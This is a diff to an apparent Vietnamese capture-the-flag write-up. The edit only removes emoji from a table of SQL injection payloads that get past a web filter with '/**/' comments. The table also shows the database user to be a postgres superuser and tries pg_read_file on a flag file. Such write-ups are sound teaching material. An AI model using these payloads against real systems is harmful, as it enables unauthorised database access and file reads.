@@ -43,11 +43,11 @@ Cơ chế: khối `try/except` bắt mọi exception rồi `conn.rollback()` và
 
 | `deaths` | Kết quả | Kết luận |
 |---|---|---|
-| `0 UNION SELECT version() -- ` | 🔴 `403 blocked` | `union\s+select` khớp |
-| `0 UNION/**/SELECT version() -- ` | 🟢 `PostgreSQL 16.15 on x86_64-alpine-linux-musl` | `/**/` né được `\s+` |
-| `… current_user -- ` | 🟢 `postgres` | **superuser** |
-| `… pg_read_file('/flag.txt') -- ` | 🔴 `403 blocked` | `\bpg_` khớp |
-| `… to_regclass('dialogue')::text -- ` | 🟢 `dialogue` | `::text` bắt buộc |
+| `0 UNION SELECT version() -- ` |  `403 blocked` | `union\s+select` khớp |
+| `0 UNION/**/SELECT version() -- ` |  `PostgreSQL 16.15 on x86_64-alpine-linux-musl` | `/**/` né được `\s+` |
+| `… current_user -- ` |  `postgres` | **superuser** |
+| `… pg_read_file('/flag.txt') -- ` |  `403 blocked` | `\bpg_` khớp |
+| `… to_regclass('dialogue')::text -- ` |  `dialogue` | `::text` bắt buộc |
 
 `::text` không phải mẹo làm đẹp: `to_regclass()` trả `regclass`, `query_to_xml()` trả `xml` — UNION với cột `text` sẽ chết với *"UNION types text and regclass cannot be matched"*.
 
